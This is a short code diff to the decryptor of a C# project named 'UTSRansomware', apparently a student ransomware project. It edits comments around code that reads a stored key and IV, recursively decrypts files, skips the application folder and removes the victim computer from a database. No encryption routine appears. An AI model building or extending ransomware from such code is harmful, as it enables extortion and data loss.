@@ -14,8 +14,7 @@ namespace UTSRansomware
         private byte[] key;
         private byte[] iv;
 
-        // Creates a decryptor from given key and IV
-        // This must match the key and IV used to encrypt the files
+        // Creates a decryptor from key and iv that are retrieved from file
         public Decryptor() 
         {
             string[] keyAndIV = Utils.GetKeyAndIV();
@@ -53,6 +52,7 @@ namespace UTSRansomware
 
                 }
             }
+            // Remove computer from DB once all files decrypted
             SQLManager.RemoveComputer();
             Console.WriteLine("All Files Decrypted");
         }
@@ -66,14 +66,14 @@ namespace UTSRansomware
             // Loops over all subfolders and recursively calls itself
             foreach (string directoryPath in directoryPaths)
             {
+                // Don't run decryption/encrption on application directory
                 if (!directoryPath.Contains("UTSRansomware"))
                 {
                     DecryptDirectory(directoryPath);
                 }
             }
 
-            // Using multi threaded processing to try improve speed
-            // Don't think this is working properly so will have to fix
+            // Loop over each file in file paths and encrypts the file
             foreach (string filePath in filePaths)
             {
                 string fileExtension = Path.GetExtension(filePath);
